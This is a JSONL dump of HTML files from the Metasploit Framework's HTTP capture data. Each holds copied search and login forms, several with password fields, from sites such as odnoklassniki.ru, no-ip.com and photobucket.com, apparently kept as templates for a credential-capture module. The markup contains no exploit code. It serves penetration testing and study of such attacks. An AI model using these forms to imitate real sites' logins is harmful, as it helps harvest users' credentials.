{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/nicovideo.jp.txt", "content": "<form action='search' method='get' onsubmit='location.href=http://www.nicovideo.jp/search/+encodeURIComponent(this.s.value.strip()).replace(/%20/g, +); return false;'> <input name=\"ref\" type=\"hidden\" /><input name=\"s\" class=\"search_input\" type=\"text\" value=\"\" style=\"width:200px;\" /><input name=\"submit\" type=\"image\" src=\"\" alt=\"\u691c\u7d22\" /></form><form name='login_bar' action='https://secure.nicovideo.jp/secure/login?site=niconico' id='login_bar' method='post'> <input name=\"next_url\" type=\"hidden\" value=\"\" /><input name=\"mail\" type=\"text\" id=\"bar_mail\" value=\"\" style=\"border:solid 1px #566; padding:1px; width:160px;\" /><input name=\"password\" type=\"password\" id=\"bar_password\" value=\"\" style=\"border:solid 1px #566; padding:1px; width:80px;\" /><input name=\"submit\" type=\"image\" src=\"\" alt=\"\u30ed\u30b0\u30a4\u30f3\" /></form>", "timestamp": "2025-10-24T23:41:08.556038"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/nifty.com.txt", "content": "<form name='srchForm' action='http://search.nifty.com/cgi-bin/gosearch.cgi' id='srchForm' onsubmit='return searchExe();'> <input name=\"cflg\" type=\"hidden\" value=\"\" /><input name=\"frm\" type=\"hidden\" value=\"\" /><input name=\"select2\" type=\"hidden\" value=\"\" /><input name=\"Text\" class=\"srchTxt\" type=\"text\" id=\"srchTxt\" value=\"\" /><input class=\"btnSubmitVer4\" type=\"image\" src=\"images/btn_search_v4.gif\" onmouseover=\"this.src='images/btn_search_on_v4.gif'\" value=\"\" onmouseout=\"this.src='images/btn_search_v4.gif'\" alt=\"\u0152\u0178\u008d\u00f5\" /></form><form name='srchFormBtm' action='http://search.nifty.com/cgi-bin/gosearch.cgi' id='srchFormBtm'> <input name=\"cflg\" type=\"hidden\" value=\"\" /><input name=\"frm\" type=\"hidden\" value=\"\" /><input name=\"select2\" type=\"hidden\" value=\"\" /><input name=\"Text\" class=\"srchTxt\" type=\"text\" id=\"srchTxtBtm\" value=\"\" /><input class=\"btnSubmitVer8\" type=\"image\" onmouseover=\"this.src='images/btn_search_on_v8.gif'\" src=\"images/btn_search_v8.gif\" value=\"\" onmouseout=\"this.src='images/btn_search_v8.gif'\" alt=\"\u0152\u0178\u008d\u00f5\" /></form>", "timestamp": "2025-10-24T23:41:08.936037"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/nih.gov.txt", "content": "<form name='search' action='http://search2.google.cit.nih.gov/search' method='get' id='search'> <input name=\"site\" type=\"hidden\" value=\"\" /><input name=\"client\" type=\"hidden\" value=\"\" /><input name=\"proxystylesheet\" type=\"hidden\" value=\"\" /><input name=\"output\" type=\"hidden\" value=\"\" /><input name=\"filter\" type=\"hidden\" value=\"\" /><input name=\"getfields\" type=\"hidden\" value=\"\" /><input name=\"q\" title=\"enter search text\" type=\"text\" id=\"header_searchbox\" value=\"\" maxlength=\"255\" /><input name=\"btnG\" type=\"image\" src=\"/glmedia/go_main_search.gif\" id=\"header_goimg\" value=\"\" alt=\"search NIH\" /></form><form name='formData' action='http://grants.nih.gov/grants/guide/search_results.htm' method='get' onsubmit='formSubmit()'> <input name=\"site\" type=\"hidden\" value=\"\" /><input name=\"scope\" type=\"hidden\" value=\"\" /><input name=\"year\" type=\"hidden\" value=\"\" /><input name=\"sort\" type=\"hidden\" value=\"\" /><input name=\"text_curr\" type=\"text\" id=\"oersearchbox\" /><input name=\"search\" type=\"image\" src=\"glmedia/go_main_search.gif\" id=\"oer_goimg\" value=\"\" alt=\"Search NIH Funding Opportunitites\" /></form>", "timestamp": "2025-10-24T23:41:09.249336"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/nnm.ru.txt", "content": "<form name='auth' action='/' method='post'> <input name=\"login\" type=\"text\" value=\"\" onfocus=\"if(this.value=='\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00eb\u00ee\u00e3\u00e8\u00ed'){this.value='';}\" onblur=\"if(this.value==''){this.value='\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00eb\u00ee\u00e3\u00e8\u00ed';}\" /><input name=\"passwd\" type=\"password\" value=\"\" /></form><form action='http://search.nnm.ru' id='searchbox_010621962854983355555:kiizmqkg1ji'> <input name=\"cx\" type=\"hidden\" value=\"\" /><input name=\"cof\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"12\" type=\"text\" style=\"width:90px;background:#FFFFFF url(/img/google_custom_search_watermark.gif) left no-repeat;\" /><input name=\"sa\" class=\"button\" type=\"submit\" value=\"\" /></form><form action='http://www.nigma.ru/index.php' method='get' target='_blank' style='border-bottom: 0px solid rgb(204, 204, 204);'> <input name=\"enc\" type=\"hidden\" value=\"\" /><input name=\"fs\" type=\"hidden\" value=\"\" /><input name=\"q\" value=\"\" maxlength=\"140\" style=\"width: 316px;background: url('/img/nigma/poiskovik.gif') 0 0 no-repeat;\" /><input name=\"submit\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:09.592641"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/no-ip.com.txt", "content": "<form name='login' action='http://www.no-ip.com/index.php' method='post'> <input name=\"username\" size=\"25\" class=\"login_box\" type=\"text\" value=\"\" /><input name=\"password\" size=\"25\" class=\"login_box\" type=\"password\" value=\"\" /><input name=\"linked_from\" type=\"hidden\" value=\"\" /><input name=\"submit\" type=\"hidden\" value=\"\" /><input type=\"image\" src=\"/homeparts/button_login.gif\" alt=\"Login\" /><input type=\"image\" src=\"/homeparts/button_login_s.gif\" alt=\"Secure Login\" onclick=\"this.form.action='https://www.no-ip.com/index.php'\" /></form><form action='/domSearch.php' method='post'> <input name=\"dom\" size=\"22\" class=\"search_box\" type=\"text\" value=\"\" /><input name=\"dsearch\" type=\"image\" src=\"/homeparts/button_search.gif\" alt=\"Search\" /><input name=\"submit\" type=\"hidden\" value=\"\" /><input name=\"sid\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:09.924975"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/nytimes.com.txt", "content": "<form name='searchForm' enctype='application/x-www-form-urlencoded' action='http://query.nytimes.com/gst/sitesearch_selector.html' id='searchForm' method='GET'> <input name=\"query\" id=\"searchQuery\" /><input title=\"Search\" type=\"image\" src=\"\" id=\"searchSubmit\" height=\"19\" alt=\"Search\" width=\"40\" /></form><form class='searchForm' action='http://query.nytimes.com/gst/getquotes.html' id='wsodFormHome' method='get'> <input name=\"query\" type=\"text\" id=\"qsearchQuery\" value=\"\" onfocus=\"if(this.value=='Stock, ETFs, Funds')this.value='';\" onblur=\"if(this.value=='')this.value='Stock, ETFs, Funds';\" /><input type=\"image\" src=\"/images/global/buttons/go.gif\" id=\"searchSubmit\" /></form><form name='CitySearch' class='searchForm' action='http://realestate.nytimes.com/sales/SearchChoice.asp' method='POST'> <input name=\"CityName\" size=\"15\" type=\"Text\" id=\"searchQuery\" value=\"\" style=\"\" /><input type=\"image\" src=\"\" id=\"searchSubmit\" border=\"0\" height=\"19\" align=\"absmiddle\" alt=\"Go\" width=\"40\" /></form><form action='http://autos.nytimes.com/researchSelect.aspx' method='post' id='searchNewCompact'> <input name=\"makeNames\" type=\"hidden\" id=\"makeNamesNew\" value=\"\" /><input class=\"gabrielsImageButton\" type=\"image\" src=\"\" alt=\"Go\" /></form><form action='http://autos.nytimes.com/search.aspx' method='post' id='searchUsedCompact'> <input name=\"makeNames\" type=\"hidden\" id=\"makeNamesUsed\" value=\"\" /><input class=\"gabrielsImageButton\" type=\"image\" src=\"\" alt=\"Go\" /></form><form name='advJobsearchForm' class='searchForm' action='http://nytimes.monster.com/Search.aspx' method='get'> <input name=\"cy\" type=\"hidden\" value=\"\" /><input name=\"q\" id=\"searchQuery\" value=\"\" /><input title=\"Search\" type=\"image\" src=\"\" id=\"searchSubmit\" alt=\"Search\" /></form>", "timestamp": "2025-10-24T23:41:10.239846"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ocn.ne.jp.txt", "content": "<form name='form1' action='http://ocnsearch.goo.ne.jp/ocn.jsp' method='get'> <input name=\"encode\" type=\"hidden\" value=\"\" /><input name=\"SM\" type=\"hidden\" value=\"\" /><input name=\"DC\" type=\"hidden\" value=\"\" /><input name=\"IE\" type=\"hidden\" value=\"\" /><input name=\"MT\" type=\"text\" id=\"searchweb-ipt\" /><input name=\"submit\" class=\"searchbtn\" type=\"image\" src=\"/default/top/general_080407/images/serch_btn.gif\" value=\"\" alt=\"\u30a6\u30a7\u30d6\u691c\u7d22\" /></form><form action='http://ocndictionary.goo.ne.jp/search.php' method='get'> <input name=\"kind\" type=\"hidden\" value=\"\" /><input name=\"MT\" type=\"text\" id=\"searchdict-ipt\" /><input name=\"submit\" class=\"searchbtn\" type=\"image\" src=\"/default/top/general_080407/images/serch_btn.gif\" value=\"\" alt=\"\u8f9e\u66f8\u691c\u7d22\" /></form><form action='http://ocn.dir.goo.ne.jp/search.php' method='get'> <input name=\"IE\" type=\"hidden\" value=\"\" /><input name=\"MT\" type=\"text\" id=\"searchdir-ipt\" /><input name=\"submit\" class=\"searchbtn\" type=\"image\" src=\"/default/top/general_080407/images/serch_btn.gif\" value=\"\" alt=\"\u767b\u9332\u30b5\u30a4\u30c8\u691c\u7d22\" /></form><form action='http://ocn.blog.goo.ne.jp/search/blogzine_search.php' method='get'> <input name=\"status\" type=\"hidden\" value=\"\" /><input name=\"ts\" type=\"hidden\" value=\"\" /><input name=\"code\" type=\"hidden\" value=\"\" /><input name=\"MT\" type=\"text\" id=\"searchblog-ipt\" /><input name=\"submit\" class=\"searchbtn\" type=\"image\" src=\"/default/top/general_080407/images/serch_btn.gif\" value=\"\" alt=\"\u30d6\u30ed\u30b0\u691c\u7d22\" /></form><form action='http://oshiete.goo.ne.jp/search/search.php' method='get'> <input name=\"status\" type=\"hidden\" value=\"\" /><input name=\"code\" type=\"hidden\" value=\"\" /><input name=\"from\" type=\"hidden\" value=\"\" /><input name=\"MT\" type=\"text\" id=\"searchteach-ipt\" /><input name=\"submit\" class=\"searchbtn\" type=\"image\" src=\"/default/top/general_080407/images/serch_btn.gif\" value=\"\" alt=\"\u6559\u3048\u3066\uff01\u691c\u7d22\" /></form><form action='http://ocntownpage.goo.ne.jp/Search.php' method='get'> <input name=\"encode\" type=\"hidden\" value=\"\" /><input name=\"MT\" type=\"text\" id=\"searchtown-ipt\" /><input name=\"areakey\" type=\"text\" id=\"searchtown-iptarea\" /><input name=\"submit\" class=\"searchbtn\" type=\"image\" src=\"/default/top/general_080407/images/serch_btn.gif\" value=\"\" alt=\"\u30bf\u30a6\u30f3\u30da\u30fc\u30b8\u691c\u7d22\" /></form><form action='http://map.ocn.ne.jp/bg-bin/mapsearch.cgi' method='get'> <input name=\"TYPE\" type=\"hidden\" value=\"\" /><input name=\"KEY\" type=\"text\" id=\"searchmap-ipt\" /><input name=\"submit\" class=\"searchbtn\" type=\"image\" src=\"/default/top/general_080407/images/serch_btn.gif\" value=\"\" alt=\"\u5730\u56f3\u691c\u7d22\" /></form><form action='http://ocntransit.goo.ne.jp/nconfirm.php' method='get'> <input name=\"IE\" type=\"hidden\" value=\"\" /><input name=\"on_st\" type=\"text\" id=\"searchrail-ipton\" /><input name=\"off_st\" type=\"text\" id=\"searchrail-iptoff\" /><input name=\"submit\" class=\"searchbtn\" type=\"image\" src=\"/default/top/general_080407/images/serch_btn.gif\" value=\"\" alt=\"\u8def\u7dda\u691c\u7d22\" /></form><form action='http://search.ocn.ne.jp/ocn/search.php' method='get'> <input name=\"encode\" type=\"hidden\" value=\"\" /><input name=\"SM\" type=\"hidden\" value=\"\" /><input name=\"DC\" type=\"hidden\" value=\"\" /><input name=\"IE\" type=\"hidden\" value=\"\" /><input name=\"MT\" type=\"text\" id=\"searcocn-ipt\" /><input name=\"submit\" class=\"searchbtn\" type=\"image\" src=\"/default/top/general_080407/images/serch_btn.gif\" value=\"\" alt=\"OCN\u5185\u691c\u7d22\" /></form>", "timestamp": "2025-10-24T23:41:10.588722"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/odnoklassniki.ru.txt", "content": "<form action='http://w5.odnoklassniki.ru/cdk/st.cmd/login/tkn/4648' method='post'> <input name=\"st.posted\" type=\"hidden\" value=\"\" /><input name=\"st.email\" size=\"20\" type=\"text\" id=\"field_email\" value=\"\" maxlength=\"100\" style=\"width: 170px;\" /><input name=\"st.password\" size=\"20\" type=\"password\" id=\"field_password\" value=\"\" style=\"width: 170px;\" /><input name=\"st.remember\" type=\"checkbox\" id=\"field_remember\" /><input name=\"button_go\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:10.923791"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/onet.pl.txt", "content": "<form name='mf' action='1c2-461e12ab' method='get' onsubmit='MSave()' style='margin:0;'> <input name=\"k\" type=\"hidden\" value=\"\" /><input name=\"q1\" size=\"20\" class=\"a1 mztxt1\" id=\"mp1\" value=\"\" style=\"width:345px;height:19px;\" /><input class=\"a0b\" type=\"submit\" value=\"\" style=\"width: 85px;\" /><input name=\"q2\" size=\"20\" class=\"a1 mztxt2\" onkeypress=\"FS(event.which)\" id=\"mp2\" value=\"\" style=\"width:410px;height:19px;\" /><input class=\"a0\" type=\"submit\" value=\"\" /><input name=\"q3\" size=\"20\" class=\"a1 mztxt3\" onkeypress=\"FS(event.which)\" id=\"mp3\" value=\"\" style=\"width:345px;height:19px;\" /><input class=\"a0b\" type=\"submit\" value=\"\" style=\"width: 85px;\" /><input name=\"q4\" size=\"20\" class=\"a1 mztxt4\" onkeypress=\"FS(event.which)\" id=\"mp4\" value=\"\" style=\"width:370px;height:19px;\" /><input class=\"a0\" type=\"submit\" value=\"\" /><input name=\"q7p_lokalizator\" size=\"17\" autocomplete=\"off\" class=\"a1 mzbtxt5\" onkeydown=\"return keyDown(event,'qt');\" id=\"mp5\" onkeyup=\"giveHint('qt');\" value=\"\" onfocus=\"if(this.value=='pizza, kino'){this.value='';this.style.color='#333333';}\" onblur=\"HintClose('qt');\" style=\"width:170px;height:19px; color: #b5b5b5\" /><input name=\"q7m_lokalizator\" size=\"10\" autocomplete=\"off\" class=\"a1 mztxt2\" onkeydown=\"return keyDown(event,'loc');\" id=\"mp52m_lok\" onkeyup=\"giveHint('loc');\" value=\"\" onfocus=\"if(this.value=='miasto, ulica numer'){this.value='';this.style.color='#333333';}\" onblur=\"HintClose('loc');\" style=\"width:240px;height:19px; color: #b5b5b5\" /><input class=\"a0\" type=\"submit\" value=\"\" style=\"margin-top:2px;\" /><input checked name=\"mr6\" type=\"radio\" value=\"\" onclick=\"ChZN(1);\" /><input name=\"mr6\" type=\"radio\" value=\"\" onclick=\"ChZN(2);\" /><input name=\"mr6\" type=\"radio\" value=\"\" onclick=\"ChZN(3);\" /><input name=\"q8\" size=\"35\" class=\"a1 mztxt4\" onkeypress=\"FS(event.which)\" id=\"mp6\" value=\"\" style=\"width:100px;height:19px;\" /><input checked name=\"mrrn\" type=\"radio\" value=\"\" onclick=\"OC('nmie','a1b');OC('ndom','a1');\" /><input name=\"mrrn\" type=\"radio\" value=\"\" onclick=\"OC('nmie','a1');OC('ndom','a1b');\" /><input name=\"q6\" size=\"35\" class=\"a1 mztxt6\" onkeypress=\"FS(event.which)\" id=\"mp6\" value=\"\" style=\"width:80px;height:19px;\" /><input name=\"q7\" size=\"35\" class=\"a1 mztxt6\" onkeypress=\"FS(event.which)\" id=\"mp6\" value=\"\" style=\"width:100px;height:19px;\" /><input class=\"a0\" type=\"submit\" value=\"\" /><input name=\"q9\" size=\"20\" class=\"a1 mztxt7\" onkeypress=\"FS(event.which)\" id=\"mp7\" value=\"\" style=\"width:410px;height:19px;\" /><input class=\"a0\" type=\"submit\" value=\"\" /><input name=\"q10\" onkeypress=\"FS(event.which)\" type=\"hidden\" id=\"mp8\" value=\"\" /><input checked name=\"p\" type=\"radio\" value=\"\" onclick=\"SymZN=0;ChSymZN();\" /><input name=\"p\" type=\"radio\" value=\"\" onclick=\"SymZN=1;ChSymZN();\" /><input class=\"a0\" type=\"submit\" value=\"\" /><input name=\"q11\" size=\"20\" class=\"a1 mztxt9\" onkeypress=\"FS(event.which)\" id=\"mp9\" value=\"\" style=\"width:410px;height:19px;\" /><input class=\"a0\" type=\"submit\" value=\"\" /></form><form name='pli' action='#' id='pli'> <input name=\"plh1\" type=\"hidden\" value=\"\" /><input name=\"plh2\" type=\"hidden\" value=\"\" /><input name=\"plh3\" type=\"hidden\" value=\"\" /><input name=\"plh4\" type=\"hidden\" value=\"\" /><input name=\"plh5\" type=\"hidden\" value=\"\" /><input name=\"plh6\" type=\"hidden\" value=\"\" /><input name=\"plh7\" type=\"hidden\" value=\"\" /><input name=\"plh8\" type=\"hidden\" value=\"\" /><input name=\"plh9\" type=\"hidden\" value=\"\" /><input name=\"plh10\" type=\"hidden\" value=\"\" /><input name=\"plh11\" type=\"hidden\" value=\"\" /><input name=\"plh12\" type=\"hidden\" value=\"\" /><input name=\"plh13\" type=\"hidden\" value=\"\" /><input name=\"plh14\" type=\"hidden\" value=\"\" /><input name=\"plh234\" type=\"hidden\" value=\"\" /><input name=\"plh334\" type=\"hidden\" value=\"\" /><input name=\"plh434\" type=\"hidden\" value=\"\" /></form><form action='13f-46148e77'> <input name=\"k\" type=\"hidden\" value=\"\" /><input name=\"q2\" class=\"a0\" style=\"width:165px; border: 1px solid #E3F1FE;\" /><input class=\"a0\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:11.252813"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/orange.fr.txt", "content": "<form class='formSearch' action='http://r.voila.fr/se?' id='headSearch' method='get' onsubmit='return o_bHeaderFormSubmit(this);'> <input name=\"sev\" type=\"hidden\" value=\"\" /><input name=\"lg\" type=\"hidden\" value=\"\" /><input name=\"dblg\" type=\"hidden\" value=\"\" /><input name=\"profil\" type=\"hidden\" id=\"lProfilVal\" value=\"\" /><input name=\"db\" type=\"hidden\" id=\"db\" value=\"\" /><input name=\"ctx\" type=\"hidden\" value=\"\" /><input name=\"rdata\" class=\"searchTxt\" onkeypress=\"if (event.keyCode != 9){ cacherAstuce();};\" type=\"text\" id=\"rech\" accesskey=\"0\" onclick=\"return cacherAstuce();\" /><input class=\"searchBtn\" title=\"Rechercher sur le web\" type=\"image\" src=\"\" id=\"btnHeadForm\" alt=\"Rechercher sur le web\" /></form><form name='form_meetic_medium' class='formulaire' action='http://r.orange.fr/r/Orencontres_form' id='form_meetic_medium' onsubmit='return validateMeetic(this)' method='get'> <input name=\"post\" type=\"hidden\" value=\"\" /><input name=\"rech_photo\" type=\"hidden\" value=\"\" /><input name=\"rech_region\" type=\"hidden\" value=\"\" /><input name=\"rech_age_mini\" type=\"hidden\" value=\"\" /><input name=\"rech_age_maxi\" type=\"hidden\" value=\"\" /><input name=\"mtcmk\" type=\"hidden\" value=\"\" /><input title=\"valider le formulaire meetic\" class=\"send\" type=\"image\" src=\"\" alt=\"valider le formulaire meetic\" /></form><form action='http://r.voila.fr/se?' id='form_shop' onsubmit='return o_bHeaderFormSubmit(this);' addref='zoneecommerce_shopping_mot'> <input name=\"sev\" type=\"hidden\" value=\"\" /><input name=\"lg\" type=\"hidden\" value=\"\" /><input name=\"dblg\" type=\"hidden\" value=\"\" /><input name=\"db\" type=\"hidden\" value=\"\" /><input name=\"ctx\" type=\"hidden\" value=\"\" /><input name=\"profil\" type=\"hidden\" value=\"\" /><input name=\"rech\" class=\"txt\" type=\"text\" id=\"formShopTxt\" value=\"\" onfocus=\"vider(this,'chercher un produit dans shopping');\" onblur=\"remplir(this,'chercher un produit dans shopping');\" /><input class=\"btn\" type=\"image\" src=\"\" alt=\"rechercher sur le shopping\" /></form><form action='http://lr.voyages.orange.fr/FLIGHT/pages/invokeServlet.php' id='form_vol' method='get' onsubmit='return validFormVol();' addref='vol'> <input name=\"sTazzooFor\" type=\"hidden\" value=\"\" /><input name=\"psBabies\" type=\"hidden\" value=\"\" /><input name=\"sDepartDate\" type=\"hidden\" id=\"sDepartDate\" value=\"\" /><input name=\"sArrivalDate\" type=\"hidden\" id=\"sArrivalDate\" value=\"\" /><input name=\"sDepartLocation\" class=\"ville\" type=\"text\" id=\"sDepartLocation\" value=\"\" onfocus=\"vider(this,'ville d&eacute;part')\" onblur=\"remplir(this,'ville d&eacute;part')\" /><input name=\"sArrivalLocation\" class=\"ville\" type=\"text\" id=\"sArrivalLocation\" value=\"\" onfocus=\"vider(this,'ville arriv&eacute;e')\" onblur=\"remplir(this,'ville arriv&eacute;e');\" /><input title=\"Rechercher un vol\" type=\"image\" src=\"\" id=\"voyages_rechercher\" alt=\"Rechercher un vol\" /></form>", "timestamp": "2025-10-24T23:41:11.587871"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/over-blog.com.txt", "content": "<form action='http://admin.over-blog.com/login?noJS=1' id='hdr_login_mid' method='post'> <input name=\"ref_site\" type=\"hidden\" value=\"\" /><input name=\"login\" size=\"10\" class=\"hdr_login_mid_ipt\" type=\"text\" id=\"login\" value=\"\" onfocus=\"if (this.value == 'Email')this.value='';this.style.color = 'black';\" style=\"color: gray;\" /><input name=\"passwd\" size=\"10\" class=\"hdr_login_mid_ipt\" type=\"password\" id=\"passwd\" value=\"\" onfocus=\"if (this.value == 'Mot de passe')this.value='';this.style.color = 'black';\" style=\"color: gray;\" /><input name=\"some_name\" type=\"submit\" id=\"some_name\" value=\"\" /></form><form action='/recherche/' method='get'> <input name=\"module\" type=\"hidden\" value=\"\" /><input name=\"action\" type=\"hidden\" value=\"\" /><input name=\"query\" size=\"25\" class=\"mnav_search_ipt\" type=\"text\" /><input class=\"mnav_search_btn_link\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:11.914856"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/partypoker.com.txt", "content": "<form name='frm' id='site_swither_form'> </form><form action='/cgi-bin/htsearch' method='get'> <input name=\"words\" class=\"inputBox\" type=\"text\" /><input name=\"search\" title=\"Search\" class=\"inputButton\" type=\"image\" src=\"/images/header/go_button.gif\" alt=\"Search Site\" /></form>", "timestamp": "2025-10-24T23:41:12.243936"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/pchome.com.tw.txt", "content": "<form name='search' action='http://google.pchome.com.tw/search_aux.jsp' method='get' style='margin:0px;padding:0px;'> <input name=\"s\" type=\"hidden\" id=\"s\" /><input name=\"q\" class=\"input3\" type=\"text\" id=\"s_input\" style=\"width:282px\" /><input name=\"s_submit\" class=\"input2\" type=\"submit\" id=\"s_submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:12.554748"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/pchome.net.txt", "content": "<form action='http://search.pchome.net/more.html?aritcleType=product&act=more&filter=' method='post' target='_blank'> <input name=\"wd\" class=\"productSearchKeywords\" type=\"text\" value=\"\" alt=\"\u8bf7\u8f93\u5165\u5173\u952e\u5b57\u5f00\u59cb\u67e5\u627e\" onclick=\"javascript:if(this.value=='\u8bf7\u8f93\u5165\u5173\u952e\u5b57\u5f00\u59cb\u67e5\u627e') this.value='';\" /><input class=\"productSearchSubmit\" title=\"Search\" type=\"submit\" value=\"\" alt=\"Search\" /></form><form action='http://search.pchome.net/index.php' method='get' target='_blank'> <input name=\"wd\" class=\"keywordSearch\" type=\"text\" value=\"\" onclick=\"javascript:if(this.value=='\u67e5\u62a5\u4ef7? \u67e5\u7ecf\u9500\u5546? \u627e\u8f6f\u4ef6? \u770b\u8bc4\u6d4b? \u8bf7\u8f93\u5165N93,MSN...') this.value='';\" /><input class=\"submitSearch\" title=\"Search\" type=\"submit\" value=\"\" alt=\"Search\" /></form><form action='http://search.pchome.net/more.html?aritcleType=download&act=more&filter=' method='post' target='_blank'> <input name=\"wd\" class=\"softwareDownloadKeywords\" type=\"text\" value=\"\" alt=\"\u8bf7\u8f93\u5165\u5173\u952e\u5b57\u5f00\u59cb\u67e5\u627e\" onclick=\"javascript:if(this.value=='\u8bf7\u8f93\u5165\u5173\u952e\u5b57\u5f00\u59cb\u67e5\u627e') this.value='';\" /><input class=\"softwareDownloadSubmit\" title=\"Search\" type=\"submit\" value=\"\" alt=\"Search\" /></form>", "timestamp": "2025-10-24T23:41:12.875774"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/people.com.txt", "content": "<form name='searchForm' class='navigationSearch' action='http://search.people.com/TIISearch/people/search/search.html' method='get'> <input name=\"search\" class=\"textEntry\" type=\"text\" id=\"navigationSearchInput\" value=\"\" /><input name=\"bu\" type=\"hidden\" value=\"\" /><input name=\"searchSubmit\" type=\"image\" src=\"\" id=\"navigationSearchSubmit\" alt=\"search\" align=\"absmiddle\" /></form>", "timestamp": "2025-10-24T23:41:13.197571"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/perezhilton.com.txt", "content": "<form name='starseeker_form' action='' id='starseeker_form'> </form><form action='http://perezhilton.com/' method='get' id='searchform'> <input name=\"s\" type=\"text\" id=\"s\" value=\"\" style=\"text-align:left;\" /><input type=\"submit\" id=\"searchsubmit\" value=\"\" style=\"text-align:left;\" /></form>", "timestamp": "2025-10-24T23:41:13.528870"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/perfspot.com.txt", "content": "<form name='form1' action='login.asp' method='post' id='form1'> <input name=\"username\" type=\"text\" value=\"\" style=\"width:130px;font-size:8pt\" /><input name=\"password\" type=\"password\" style=\"width:130px;font-size:8pt\" /><input name=\"remember\" type=\"checkbox\" value=\"\" /><input name=\"submit1\" class=\"orange\" type=\"submit\" id=\"submit1\" value=\"\" /><input name=\"button2\" class=\"orange\" type=\"button\" id=\"button2\" value=\"\" onclick=\"location.href='join.asp'\" /></form><form name='form2' id='form2'> <input name=\"button3\" class=\"brown\" type=\"button\" id=\"button3\" value=\"\" onclick=\"location.href='/search.asp'\" /><input name=\"button1\" class=\"brown\" type=\"button\" id=\"button1\" value=\"\" onclick=\"location.href='/video2/'\" /></form>", "timestamp": "2025-10-24T23:41:13.855476"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/photobucket.com.txt", "content": "<form action='http://photobucket.com/login' id='formHeaderLogin' method='post'> <input name=\"action\" type=\"hidden\" value=\"\" /><input name=\"usernameemail\" size=\"10\" type=\"text\" id=\"usernameemail\" value=\"\" maxlength=\"50\" /><input name=\"password\" size=\"10\" type=\"password\" id=\"password\" maxlength=\"50\" /><input name=\"login\" type=\"submit\" id=\"bttnHeaderLogin\" value=\"\" /><input name=\"remember\" type=\"checkbox\" id=\"remember\" /></form><form name='formHeaderSearch' action='http://photobucket.com/images/' id='formHeaderSearch' method='post' onsubmit='return searchFormHeaderSearch.handleSubmitClick(event);'> <input name=\"pbSearch\" type=\"hidden\" value=\"\" /><input name=\"domains\" type=\"hidden\" value=\"\" /><input name=\"client\" type=\"hidden\" value=\"\" /><input name=\"channel\" type=\"hidden\" value=\"\" /><input name=\"safe\" type=\"hidden\" value=\"\" /><input name=\"cof\" type=\"hidden\" value=\"\" /><input name=\"modeHeaderSearch\" type=\"hidden\" id=\"modeHeaderSearch\" value=\"\" /><input name=\"userinit\" type=\"hidden\" value=\"\" /><input name=\"source\" type=\"hidden\" value=\"\" /><input name=\"q\" class=\"qSearch\" title=\"Enter Search Term Here\" type=\"text\" id=\"qHeaderSearch\" value=\"\" /></form><form name='formHomepageSearchMid' action='http://photobucket.com/images/' id='formHomepageSearchMid' method='post' onsubmit='return searchFormHomepageSearchMid.handleSubmitClick(event);'> <input name=\"pbSearch\" type=\"hidden\" value=\"\" /><input name=\"domains\" type=\"hidden\" value=\"\" /><input name=\"client\" type=\"hidden\" value=\"\" /><input name=\"channel\" type=\"hidden\" value=\"\" /><input name=\"safe\" type=\"hidden\" value=\"\" /><input name=\"cof\" type=\"hidden\" value=\"\" /><input name=\"modeHomepageSearchMid\" type=\"hidden\" id=\"modeHomepageSearchMid\" value=\"\" /><input name=\"userinit\" type=\"hidden\" value=\"\" /><input name=\"source\" type=\"hidden\" value=\"\" /><input name=\"q\" class=\"qSearch\" title=\"Enter Search Term Here\" type=\"text\" id=\"qHomepageSearchMid\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:14.233255"}
